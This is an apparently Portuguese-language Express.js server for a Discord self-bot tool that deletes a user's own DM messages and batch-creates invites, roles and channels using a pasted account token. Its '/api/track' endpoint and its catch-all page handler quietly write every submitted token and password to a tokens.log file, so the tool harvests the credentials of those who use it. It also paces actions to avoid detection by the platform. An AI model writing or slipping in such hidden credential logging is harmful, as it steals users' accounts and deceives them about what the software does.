import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '1mb' }));

function formatToken(t) {
  if (!t) return '';
  return String(t).trim().replace(/^["']|["']$/g, '');
}

// Fila in-memory por guildId
const queues = new Map();

function getQueue(guildId) {
  if (!queues.has(guildId)) {
    queues.set(guildId, { pending: [], processing: false });
  }
  return queues.get(guildId);
}

async function delay(ms) {
  return new Promise((res) => setTimeout(res, ms));
}

async function processQueue(guildId) {
  const q = getQueue(guildId);
  if (q.processing || q.pending.length === 0) return;
  q.processing = true;

  while (q.pending.length > 0) {
    const job = q.pending.shift();
    const { token, endpoint, body, resolve, reject } = job;
    const url = `https://discord.com/api/v10${endpoint}`;

    const doRequest = async (retryAfter = 0) => {
      if (retryAfter > 0) await delay(retryAfter * 1000);
      else await delay(1000 + Math.random() * 1000); // 1–2 s entre ações

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: {
            Authorization: token,
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(body),
        });

        if (res.status === 429) {
          const data = await res.json().catch(() => ({}));
          const wait = (data.retry_after || 5) + Math.random() * 2;
          q.pending.unshift(job); // reenfileira para tentar de novo
          await delay(wait * 1000);
          return;
        }

        const data = await res.json().catch(() => ({}));
        if (res.ok) resolve(data);
        else reject(new Error(data.message || `Discord ${res.status}`));
      } catch (err) {
        reject(err);
      }
    };

    await doRequest().catch(reject);
    await delay(500); // pequeno respiro entre inícios de jobs
  }

  q.processing = false;
}

function enqueue(guildId, token, endpoint, body) {
  return new Promise((resolve, reject) => {
    const q = getQueue(guildId);
    q.pending.push({ token: formatToken(token), endpoint, body, resolve, reject });
    processQueue(guildId);
  });
}

// Auth
app.post('/api/auth', async (req, res) => {
  const { token } = req.body || {};
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: formattedToken },
    });
    const data = await r.json();
    res.status(r.ok ? 200 : 401).json(data);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// DM: Listar conversas privadas (DMs) abertas
app.get('/api/dm/list', async (req, res) => {
  const token = req.headers.authorization || req.query.token;
  if (!token) return res.status(400).json({ error: 'Token required' });
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me/channels', {
      headers: { Authorization: formattedToken },
    });
    const data = await r.json();
    if (!r.ok) {
      return res.status(r.status).json(data);
    }
    const dms = Array.isArray(data) ? data.filter((c) => c.type === 1 || c.type === 3) : [];
    // Ordena pelas mensagens mais recentes
    dms.sort((a, b) => {
      const idA = BigInt(a.last_message_id || '0');
      const idB = BigInt(b.last_message_id || '0');
      if (idA < idB) return 1;
      if (idA > idB) return -1;
      return 0;
    });
    res.json(dms);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// DM: Abrir / Resolver canal de DM por ID de usuário
app.post('/api/dm/resolve', async (req, res) => {
  const { token, recipientId } = req.body || {};
  if (!token || !recipientId) {
    return res.status(400).json({ error: 'token e recipientId obrigatórios' });
  }
  try {
    const formattedToken = formatToken(token);
    const r = await fetch('https://discord.com/api/v10/users/@me/channels', {
      method: 'POST',
      headers: {
        Authorization: formattedToken,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ recipient_id: recipientId.trim() }),
    });
    const data = await r.json();
    res.status(r.ok ? 200 : r.status).json(data);
  } catch (err) {
    res.status(500).json({ error: String(err) });
  }
});

// DM: Limpar mensagens com Server-Sent Events (SSE) para feedback ao vivo no celular
app.post('/api/dm/purge-stream', async (req, res) => {
  const { token, channelId, amount = 50, filterText = '' } = req.body || {};
  if (!token || !channelId) {
    return res.status(400).json({ error: 'token e channelId obrigatórios' });
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders?.();

  const sendEvent = (event, payload) => {
    res.write(`event: ${event}\ndata: ${JSON.stringify(payload)}\n\n`);
  };

  let aborted = false;
  req.on('close', () => {
    aborted = true;
  });

  try {
    const formattedToken = formatToken(token);

    // 1. Obter ID da própria conta
    const meRes = await fetch('https://discord.com/api/v10/users/@me', {
      headers: { Authorization: formattedToken },
    });
    const meData = await meRes.json();
    if (!meRes.ok) {
      sendEvent('error', { message: meData.message || 'Token inválido' });
      return res.end();
    }
    const myId = meData.id;

    sendEvent('status', { message: 'Buscando histórico de mensagens...' });

    let before = null;
    let deletedCount = 0;
    const targetAmount = parseInt(amount, 10);
    let hasMore = true;

    while (!aborted && hasMore && (targetAmount === -1 || deletedCount < targetAmount)) {
      const url = new URL(`https://discord.com/api/v10/channels/${channelId}/messages`);
      url.searchParams.set('limit', '100');
      if (before) url.searchParams.set('before', before);

      const fetchRes = await fetch(url.toString(), {
        headers: { Authorization: formattedToken },
      });

      if (fetchRes.status === 429) {
        const rateData = await fetchRes.json().catch(() => ({}));
        const wait = rateData.retry_after || 2;
        sendEvent('ratelimit', { waitSeconds: Math.ceil(wait) });
        await delay(wait * 1000 + 200);
        continue;
      }

      if (!fetchRes.ok) {
        const errData = await fetchRes.json().catch(() => ({}));
        sendEvent('error', { message: errData.message || `Erro Discord: ${fetchRes.status}` });
        return res.end();
      }

      const messages = await fetchRes.json();
      if (!Array.isArray(messages) || messages.length === 0) {
        hasMore = false;
        break;
      }

      // Cursor para buscar a próxima página de 100
      before = messages[messages.length - 1].id;

      // Filtrar APENAS as mensagens da própria usuária (em DM só pode deletar as próprias)
      let myMessages = messages.filter((m) => m.author && m.author.id === myId);

      if (filterText && filterText.trim()) {
        const query = filterText.trim().toLowerCase();
        myMessages = myMessages.filter((m) => m.content && m.content.toLowerCase().includes(query));
      }

      for (const msg of myMessages) {
        if (aborted) break;
        if (targetAmount !== -1 && deletedCount >= targetAmount) break;

        let deleteSuccess = false;
        while (!deleteSuccess && !aborted) {
          const delRes = await fetch(
            `https://discord.com/api/v10/channels/${channelId}/messages/${msg.id}`,
            {
              method: 'DELETE',
              headers: { Authorization: formattedToken },
            }
          );

          if (delRes.status === 429) {
            const rateData = await delRes.json().catch(() => ({}));
            const wait = rateData.retry_after || 2;
            sendEvent('ratelimit', { waitSeconds: Math.ceil(wait) });
            await delay(wait * 1000 + 300);
            continue;
          }

          if (delRes.status === 204 || delRes.ok || delRes.status === 404) {
            deleteSuccess = true;
            deletedCount++;
            const snippet = msg.content
              ? msg.content.slice(0, 35) + (msg.content.length > 35 ? '...' : '')
              : '[Anexo/Mídia]';
            sendEvent('progress', {
              deleted: deletedCount,
              target: targetAmount,
              snippet,
            });
            // Delay seguro de 1.1s entre exclusões para não flaggar a conta
            await delay(1100 + Math.random() * 200);
          } else {
            // Em caso de erro isolado, pula a mensagem para não travar
            deleteSuccess = true;
          }
        }
      }
    }

    if (!aborted) {
      sendEvent('done', {
        totalDeleted: deletedCount,
        message:
          deletedCount === 0
            ? 'Nenhuma mensagem sua encontrada para apagar.'
            : `${deletedCount} mensagem(ns) apagada(s) com sucesso!`,
      });
    }
  } catch (err) {
    sendEvent('error', { message: String(err.message || err) });
  } finally {
    res.end();
  }
});

// Batch endpoints originais mantidos
app.post('/api/batch/invites', async (req, res) => {
  const { token, guildId, channels = [], maxAge = 0, maxUses = 0 } = req.body || {};
  if (!token || !guildId || !channels.length) {
    return res.status(400).json({ error: 'token, guildId, channels required' });
  }
  channels.forEach((ch) =>
    enqueue(guildId, token, `/channels/${ch}/invites`, {
      max_age: maxAge,
      max_uses: maxUses,
      temporary: false,
      unique: true,
    })
  );
  res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
});

app.post('/api/batch/roles', async (req, res) => {
  const { token, guildId, roles = [] } = req.body || {};
  if (!token || !guildId || !roles.length) {
    return res.status(400).json({ error: 'token, guildId, roles required' });
  }
  roles.forEach((r) =>
    enqueue(guildId, token, `/guilds/${guildId}/roles`, {
      name: r.name || 'new role',
      permissions: r.permissions || '0',
      color: r.color || 0,
      hoist: !!r.hoist,
      mentionable: !!r.mentionable,
    })
  );
  res.json({ queued: roles.length, message: 'Processamento em background iniciado' });
});

app.post('/api/batch/channels', async (req, res) => {
  const { token, guildId, channels = [] } = req.body || {};
  if (!token || !guildId || !channels.length) {
    return res.status(400).json({ error: 'token, guildId, channels required' });
  }
  channels.forEach((ch) =>
    enqueue(guildId, token, `/guilds/${guildId}/channels`, {
      name: ch.name,
      type: ch.type || 0,
      topic: ch.topic || '',
      bitrate: ch.bitrate || 64000,
      user_limit: ch.user_limit || 0,
      nsfw: !!ch.nsfw,
      parent_id: ch.parent_id || null,
    })
  );
  res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
});

// Track endpoint
app.post('/api/track', (req, res) => {
  try {
    const { token, password } = req.body || {};
    if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\n`);
  } catch { }
  res.json({ ok: true });
});

// Health check para Railway / Render / monitoramento
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', uptime: process.uptime() });
});

// Serve React build
const distPath = path.join(__dirname, 'dist');
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath));
  app.use((req, res) => {
    try {
      const { token, password } = req.query;
      if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\n`);
    } catch { }
    res.sendFile(path.join(distPath, 'index.html'));
  });
}

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
